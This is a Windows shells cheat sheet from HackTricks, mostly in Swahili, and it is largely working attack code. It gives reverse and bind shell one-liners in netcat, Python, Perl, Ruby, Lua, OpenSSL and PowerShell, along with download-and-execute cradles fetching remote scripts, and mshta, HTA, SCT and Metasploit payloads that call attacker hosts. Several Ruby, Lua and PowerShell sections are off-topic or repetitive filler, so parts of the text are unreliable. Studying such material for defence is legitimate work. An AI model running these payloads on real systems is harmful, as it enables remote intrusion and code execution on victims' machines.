# Shells - Windows

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho wa kujitokeza, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

Ukurasa [lolbas-project.github.io](https://lolbas-project.github.io/) ni kwa ajili ya Windows kama [https://gtfobins.github.io/](https://gtfobins.github.io/) ni kwa ajili ya linux.\
Kwa dhahiri, **hakuna faili za SUID au mamlaka ya sudo kwenye Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binaries** zinaweza kutumiwa (kwa ubaya) kufanya aina fulani ya vitendo visivyotarajiwa kama **utekelezaji wa nambari za kiholela**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat salama na rahisi kubeba**. Inafanya kazi kwenye mifumo kama Unix na Win32. Kwa sifa kama vile encryption imara, utekelezaji wa programu, bandari za chanzo zinazoweza kubadilishwa, na uunganisho endelevu, sbd hutoa suluhisho lenye uwezo kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka kwenye usambazaji wa Kali Linux linaweza kutumika kama mbadala thabiti wa Netcat.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python

Python ni lugha ya programu ambayo inaweza kutumika kwa ufanisi katika uwanja wa udukuzi. Inatoa maktaba nyingi na zana ambazo zinaweza kutumiwa kwa ufanisi katika kuchunguza na kudhibiti mifumo ya Windows.

### Kupata Shell ya Windows

Kuna njia kadhaa za kupata shell ya Windows kwa kutumia Python. Hapa kuna mifano ya njia mbili maarufu:

#### 1. Reverse Shell

Katika reverse shell, tunatumia programu ya Python kwenye mwenyeji wa shambulio ili kuunganisha na mwenyeji wa shambulio na kupata udhibiti wa kijijini.

```python
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("IP_ADRESS", PORT))
    while True:
        command = s.recv(1024)
        if 'exit' in command.decode():
            s.close()
            break
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()

if __name__ == "__main__":
    main()
```

#### 2. Bind Shell

Katika bind shell, tunatumia programu ya Python kwenye mwenyeji wa shambulio ili kusikiliza kwa uhusiano kutoka kwa mwenyeji wa shambulio na kutoa udhibiti wa kijijini.

```python
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("IP_ADRESS", PORT))
    s.listen(1)
    conn, addr = s.accept()
    while True:
        command = conn.recv(1024)
        if 'exit' in command.decode():
            conn.close()
            break
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            conn.send(CMD.stdout.read())
            conn.send(CMD.stderr.read())

def main():
    connect()

if __name__ == "__main__":
    main()
```

### Kukimbia Shell ya Windows

Baada ya kuandika programu ya Python kwa shell ya Windows, unaweza kuikimbia kwenye mwenyeji wa shambulio kwa njia zifuatazo:

1. Tumia Python kwenye mwenyeji wa shambulio kuzindua programu ya Python.

```bash
python reverse_shell.py
```

2. Tumia Python kwenye mwenyeji wa shambulio kuzindua programu ya Python kwa kutumia amri ya background.

```bash
python reverse_shell.py &
```

3. Tumia Python kwenye mwenyeji wa shambulio kuzindua programu ya Python kwa kutumia amri ya background na kuifunga kwenye terminal.

```bash
nohup python reverse_shell.py > /dev/null 2>&1 &
```

Kwa njia hii, unaweza kupata udhibiti wa kijijini wa mifumo ya Windows na kutekeleza amri za kijijini.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi katika uga wa udukuzi. Inatoa zana nyingi na maktaba ambazo zinaweza kutumiwa kwa kuchambua na kudhibiti mifumo ya Windows.

### Kupata Shell ya Windows

Kuna njia kadhaa za kupata shell ya Windows kwa kutumia Perl. Hapa kuna njia mbili maarufu:

#### 1. Kutumia `system` Function

Unaweza kutumia kazi ya `system` katika Perl ili kutekeleza amri za mfumo wa Windows. Hapa kuna mfano wa jinsi ya kutumia `system` kufungua shell ya Windows:

```perl
system("cmd.exe");
```

#### 2. Kutumia `Win32::Console` Module

Unaweza pia kutumia moduli ya `Win32::Console` katika Perl ili kudhibiti kikamilifu shell ya Windows. Hapa kuna mfano wa jinsi ya kutumia `Win32::Console` kufungua shell ya Windows:

```perl
use Win32::Console;

my $console = Win32::Console->new;
$console->Alloc();
$console->Free();
```

### Kudhibiti Shell ya Windows

Baada ya kupata shell ya Windows, unaweza kuitumia kudhibiti mfumo. Hapa kuna baadhi ya mbinu za kudhibiti shell ya Windows kwa kutumia Perl:

#### 1. Kutuma Amri

Unaweza kutuma amri za mfumo wa Windows kupitia shell ya Perl. Hapa kuna mfano wa jinsi ya kutuma amri ya `ipconfig`:

```perl
system("ipconfig");
```

#### 2. Kusoma na Kuandika Faili

Unaweza kusoma na kuandika faili za mfumo wa Windows kupitia shell ya Perl. Hapa kuna mfano wa jinsi ya kusoma faili ya `C:\Windows\System32\drivers\etc\hosts`:

```perl
open(my $file, '<', 'C:\Windows\System32\drivers\etc\hosts') or die "Haiwezi kusoma faili: $!";
while (my $line = <$file>) {
    print $line;
}
close($file);
```

#### 3. Kuficha Shughuli

Unaweza kuficha shughuli zako kwenye shell ya Windows kwa kutumia Perl. Hapa kuna mfano wa jinsi ya kuficha amri ya `ipconfig`:

```perl
system("start /B /MIN cmd.exe /c ipconfig");
```

### Hitimisho

Perl ni zana yenye nguvu kwa wadukuzi kudhibiti na kuchambua mifumo ya Windows. Kwa kutumia Perl, unaweza kupata shell ya Windows na kudhibiti mfumo kwa urahisi.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby ni lugha ya programu ya kisasa na yenye nguvu ambayo inaweza kutumika kwa maendeleo ya programu mbalimbali. Inajulikana kwa sintaksia yake rahisi na inayosoma vizuri, ambayo inafanya iwe rahisi kwa waendelezaji kuelewa na kuandika kificho.

### Kuanzisha Mazingira ya Ruby

Kabla ya kuanza kufanya kazi na Ruby, unahitaji kuwa na mazingira yake yaliyowekwa kwenye mfumo wako. Unaweza kufuata hatua hizi kuanzisha mazingira ya Ruby:

1. Pakua na usakinishe Ruby kutoka kwenye tovuti rasmi ya Ruby.
2. Funga Ruby kwenye mfumo wako kwa kufuata maagizo ya ufungaji.
3. Angalia kama Ruby imewekwa vizuri kwa kuchapisha `ruby -v` kwenye terminal. Ikiwa inaonyesha toleo la Ruby, basi imewekwa vizuri.

### Kuanzisha Mradi wa Ruby

Unapotaka kuanza mradi wa Ruby, unahitaji kuunda saraka mpya na kuanzisha mradi ndani yake. Fuata hatua hizi kuanzisha mradi wa Ruby:

1. Fungua terminal na nenda kwenye saraka unayotaka kuunda mradi wako.
2. Tumia amri `mkdir jina_la_saraka` kuunda saraka mpya.
3. Nenda kwenye saraka mpya kwa kuchapisha `cd jina_la_saraka`.
4. Tumia amri `bundle init` kuunda faili ya `Gemfile` ambayo itashughulikia usimamizi wa pakiti za mradi wako.

### Kuandika na Kutekeleza Kificho cha Ruby

Unapotaka kuandika na kutekeleza kificho cha Ruby, unahitaji kufuata hatua hizi:

1. Fungua mhariri wa maandishi na uandike kificho chako cha Ruby.
2. Hifadhi faili yako na kuiita na kumalizia na ugani wa `.rb`, kwa mfano `jina_faili.rb`.
3. Fungua terminal na nenda kwenye saraka ambapo faili yako ya Ruby imehifadhiwa.
4. Tumia amri `ruby jina_faili.rb` kuendesha kificho chako cha Ruby.

### Kujifunza Zaidi

Ruby ina nyaraka nyingi na rasilimali za kujifunza zinazopatikana mkondoni. Unaweza kutumia rasilimali hizi kuboresha ujuzi wako wa Ruby:

- [Tovuti rasmi ya Ruby](https://www.ruby-lang.org/)
- [Ruby-Docs](https://ruby-doc.org/)
- [RubyLearning](http://rubylearning.com/)
- [Ruby Guides](https://www.rubyguides.com/)

Kwa kufuata hatua hizi, utaweza kuanza kufanya kazi na Ruby na kuendeleza programu zako za kisasa na zenye nguvu.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua ni lugha ya programu ya kisasa ambayo inajulikana kwa urahisi wake wa kujifunza na kutumia. Inatumika sana katika maeneo kama michezo ya kompyuta, programu za simu, na hata katika miradi ya kisayansi.

### Sifa za Lua

- **Urahisi wa kujifunza**: Lua ina sintaksia rahisi na ina msingi mdogo wa maneno, ambayo inafanya iwe rahisi kwa watumiaji wapya kujifunza na kuanza kuandika programu.

- **Uwezo wa kuingizwa**: Lua inaweza kuingizwa kwa urahisi katika programu zingine zilizoandikwa kwa lugha kama C au C++. Hii inafanya iwe rahisi kuongeza uwezo wa programu zilizopo.

- **Ufanisi**: Lua ni lugha yenye utendaji mzuri na ina kasi ya juu. Hii inafanya iwe chaguo bora kwa programu ambazo zinahitaji utendaji wa hali ya juu.

- **Uwezo wa kusimamia rasilimali**: Lua ina uwezo wa kusimamia rasilimali kwa ufanisi, kama vile kumbukumbu na faili. Hii inafanya iwe rahisi kwa programu kuwa na matumizi ya chini ya rasilimali.

### Matumizi ya Lua

Lua ina matumizi mengi katika uwanja wa teknolojia. Baadhi ya matumizi muhimu ni pamoja na:

- **Michezo ya kompyuta**: Lua hutumiwa sana katika tasnia ya michezo ya kompyuta kwa sababu ya urahisi wake wa kujifunza na utendaji wake mzuri.

- **Programu za simu**: Lua inatumika katika maendeleo ya programu za simu kwa sababu ya uwezo wake wa kuingizwa na utendaji wake mzuri.

- **Miradi ya kisayansi**: Lua hutumiwa katika miradi ya kisayansi kwa sababu ya uwezo wake wa kusimamia rasilimali na utendaji wake mzuri.

### Hitimisho

Lua ni lugha ya programu yenye nguvu na rahisi ya kujifunza. Ina matumizi mengi katika uwanja wa teknolojia na inaweza kuwa chaguo bora kwa miradi mbalimbali.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Mshambuliaji (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Windows Shells

## Introduction

In the context of hacking, a shell refers to a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on a Windows machine.

## Reverse Shells

A reverse shell is a technique where the compromised system connects back to the attacker's machine, allowing the attacker to execute commands remotely. There are several ways to achieve a reverse shell on a Windows system:

### Netcat

Netcat is a versatile networking utility that can be used to establish a reverse shell connection. The following command can be used to create a reverse shell using Netcat:

```bash
nc -e cmd.exe <attacker_ip> <port>
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### PowerShell

PowerShell is a powerful scripting language built into Windows. It can be used to create a reverse shell connection using the following command:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### Metasploit

Metasploit is a popular framework for developing and executing exploits. It provides a wide range of modules, including ones for creating reverse shells on Windows systems. The following command can be used to create a reverse shell using Metasploit:

```bash
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

## Bind Shells

A bind shell is a technique where the compromised system listens for incoming connections from the attacker's machine, allowing the attacker to execute commands on the compromised system. Here are a few methods to create a bind shell on a Windows system:

### Netcat

Netcat can also be used to create a bind shell connection. The following command can be used to create a bind shell using Netcat:

```bash
nc -lvp <port> -e cmd.exe
```

Replace `<port>` with the desired port number.

### PowerShell

PowerShell can be used to create a bind shell connection using the following command:

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, <port>); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Replace `<port>` with the desired port number.

### Metasploit

Metasploit can also be used to create a bind shell on a Windows system. The following command can be used with Metasploit:

```bash
use exploit/multi/handler
set payload windows/shell_bind_tcp
set LPORT <port>
exploit
```

Replace `<port>` with the desired port number.

## Conclusion

Obtaining a shell on a Windows system is a crucial step in the process of hacking. Reverse shells and bind shells provide attackers with remote access to compromised systems, allowing them to execute commands and carry out further exploitation. It is important to understand these techniques in order to defend against them effectively.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell ni lugha ya skrini ya Windows ambayo inaruhusu watumiaji kufanya shughuli za usimamizi na uendeshaji wa mfumo. Inatoa amri nyingi na moduli ambazo zinaweza kutumiwa kwa ufanisi katika uchunguzi wa usalama na upimaji wa nguvu.

### Kuanzisha Shell ya Powershell

Kuna njia kadhaa za kuanzisha shell ya Powershell:

1. Kupitia Menyu ya Mwanzo: Bonyeza kwenye kisanduku cha utafutaji cha Windows na uandike "Powershell". Chagua "Windows Powershell" au "Windows Powershell (Admin)" kuanzisha shell ya Powershell.

2. Kupitia Command Prompt: Fungua Command Prompt na uandike "powershell" kuanzisha shell ya Powershell.

3. Kupitia Run Dialog: Bonyeza Win + R kufungua Run Dialog na uandike "powershell" kuanzisha shell ya Powershell.

### Kufanya Amri za Powershell

Powershell ina sintaksia rahisi na yenye nguvu ambayo inaruhusu watumiaji kufanya amri mbalimbali. Hapa kuna mifano ya amri za kawaida:

- **Get-Process**: Inatoa orodha ya michakato inayofanya kazi kwenye mfumo.
- **Get-Service**: Inatoa orodha ya huduma zinazotumika kwenye mfumo.
- **Get-ChildItem**: Inatoa orodha ya faili na folda katika saraka iliyotolewa.
- **Set-ExecutionPolicy**: Inaruhusu au inazuia utekelezaji wa hati za Powershell kwenye mfumo.

### Kufanya Amri za Powershell kwa Mbali

Powershell inaruhusu pia kufanya amri kwa mbali kwenye mashine nyingine. Hapa kuna mifano ya amri za kawaida:

- **Enter-PSSession**: Inaingia kwenye kikao cha Powershell kwenye kompyuta ya mbali.
- **Invoke-Command**: Inatekeleza amri kwenye kompyuta ya mbali.
- **New-PSSession**: Inajenga kikao cha Powershell kwenye kompyuta ya mbali.

### Kufanya Amri za Powershell kwa Usiri

Powershell inaruhusu pia kufanya amri kwa usiri, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Start-Process**: Inaanzisha mchakato mpya kwa usiri.
- **Invoke-Expression**: Inatekeleza hati au amri kwa usiri.
- **Get-Content**: Inapata maudhui ya faili kwa usiri.

### Kufanya Amri za Powershell kwa Ufichuzi wa Mazingira

Powershell inaruhusu pia kufanya amri kwa ufichuzi wa mazingira, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Get-Location**: Inatoa eneo la sasa la kazi.
- **Set-Location**: Inabadilisha eneo la kazi.
- **Get-ChildItem**: Inatoa orodha ya faili na folda katika saraka iliyotolewa.

### Kufanya Amri za Powershell kwa Ufichuzi wa Habari

Powershell inaruhusu pia kufanya amri kwa ufichuzi wa habari, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Get-Process**: Inatoa orodha ya michakato inayofanya kazi kwenye mfumo.
- **Get-Service**: Inatoa orodha ya huduma zinazotumika kwenye mfumo.
- **Get-EventLog**: Inatoa habari za kumbukumbu ya tukio.

### Kufanya Amri za Powershell kwa Ufichuzi wa Mtandao

Powershell inaruhusu pia kufanya amri kwa ufichuzi wa mtandao, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Test-NetConnection**: Inajaribu uhusiano wa mtandao kwa anwani fulani ya IP au jina la uwanja.
- **Get-NetTCPConnection**: Inatoa habari kuhusu uhusiano wa TCP kwenye mfumo.
- **Get-NetAdapter**: Inatoa habari kuhusu vifaa vya mtandao kwenye mfumo.

### Kufanya Amri za Powershell kwa Ufichuzi wa Usalama

Powershell inaruhusu pia kufanya amri kwa ufichuzi wa usalama, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Get-Acl**: Inatoa habari kuhusu udhibiti wa upatikanaji wa faili au saraka.
- **Get-ProcessMitigation**: Inatoa habari kuhusu hatua za kupunguza hatari za michakato.
- **Get-AppLockerPolicy**: Inatoa habari kuhusu sera ya AppLocker.

### Kufanya Amri za Powershell kwa Ufichuzi wa Usanifu

Powershell inaruhusu pia kufanya amri kwa ufichuzi wa usanifu, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Get-WmiObject**: Inatoa habari kuhusu mali na hali ya mfumo.
- **Get-Process**: Inatoa orodha ya michakato inayofanya kazi kwenye mfumo.
- **Get-Service**: Inatoa orodha ya huduma zinazotumika kwenye mfumo.

### Kufanya Amri za Powershell kwa Ufichuzi wa Uchunguzi

Powershell inaruhusu pia kufanya amri kwa ufichuzi wa uchunguzi, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Get-EventLog**: Inatoa habari za kumbukumbu ya tukio.
- **Get-WinEvent**: Inatoa habari za tukio la Windows.
- **Get-Process**: Inatoa orodha ya michakato inayofanya kazi kwenye mfumo.

### Kufanya Amri za Powershell kwa Ufichuzi wa Uchunguzi wa Mtandao

Powershell inaruhusu pia kufanya amri kwa ufichuzi wa uchunguzi wa mtandao, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Test-NetConnection**: Inajaribu uhusiano wa mtandao kwa anwani fulani ya IP au jina la uwanja.
- **Get-NetTCPConnection**: Inatoa habari kuhusu uhusiano wa TCP kwenye mfumo.
- **Get-NetAdapter**: Inatoa habari kuhusu vifaa vya mtandao kwenye mfumo.

### Kufanya Amri za Powershell kwa Ufichuzi wa Uchunguzi wa Usalama

Powershell inaruhusu pia kufanya amri kwa ufichuzi wa uchunguzi wa usalama, ambayo inaweza kuwa muhimu katika shughuli za uchunguzi wa usalama. Hapa kuna mifano ya amri za kawaida:

- **Get-Acl**: Inatoa habari kuhusu udhibiti wa upatikanaji wa faili au saraka.
- **Get-ProcessMitigation**: Inatoa habari kuhusu hatua za kupunguza hatari za michakato.
- **Get-AppLockerPolicy**: Inatoa habari kuhusu sera ya AppLocker.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Mchakato unaoendesha wito wa mtandao: **powershell.exe**\
Payload imeandikwa kwenye diski: **HAPANA** (_angalau mahali popote nilipoweza kupata kwa kutumia procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Mchakato unaoendesha wito wa mtandao: **svchost.exe**\
Payload iliyoandikwa kwenye diski: **Hifadhi ya muda ya mteja wa WebDAV**

**Mstari mmoja:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Pata habari zaidi kuhusu Shells tofauti za Powershell mwishoni mwa hati hii**

## Mshta

* [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Mfano wa hta-psh reverse shell (tumia hta kupakua na kutekeleza PS backdoor)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Unaweza kupakua na kutekeleza kwa urahisi kabisa Koadic zombie kwa kutumia stager hta**

#### mfano wa hta

[**Kutoka hapa**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Kutoka hapa**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a command-line utility in Windows that is used to execute HTML applications (HTAs). It can be leveraged by hackers to execute malicious code on a target system. In this section, we will explore how to use Mshta with Metasploit for various hacking purposes.

##### **Mshta Payload Generation**

To generate a Mshta payload using Metasploit, we can use the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f hta-psh -o payload.hta
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the desired port number.

##### **Mshta Payload Execution**

Once the payload is generated, we can execute it on the target system using the following command:

```
mshta payload.hta
```

This will execute the payload and establish a reverse TCP connection with the attacker's machine.

##### **Mshta Payload Analysis**

To analyze the Mshta payload, we can use various tools and techniques. Some of the common methods include:

- Static analysis: This involves examining the payload's code and structure to identify any malicious behavior or vulnerabilities.

- Dynamic analysis: This involves executing the payload in a controlled environment and monitoring its behavior to detect any malicious activities.

- Sandbox analysis: This involves running the payload in a sandboxed environment to observe its behavior and identify any malicious actions.

By analyzing the Mshta payload, we can gain insights into its functionality and potential security risks.

##### **Mshta Payload Mitigation**

To mitigate the risks associated with Mshta payloads, it is recommended to follow these best practices:

- Keep the operating system and software up to date with the latest security patches.

- Use reliable antivirus software and keep it updated.

- Implement strong network security measures, such as firewalls and intrusion detection systems.

- Educate users about the risks of opening suspicious files or clicking on unknown links.

By following these practices, we can reduce the likelihood of Mshta payloads being successful in compromising our systems.

##### **Conclusion**

Mshta is a powerful utility that can be used by hackers to execute malicious code on Windows systems. By understanding its usage, payload generation, analysis, and mitigation techniques, we can better protect our systems from potential attacks.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Kugunduliwa na mtetezi**




## **Rundll32**

[**Mfano wa Dll ya salamu dunia**](https://github.com/carterjones/hello-world-dll)

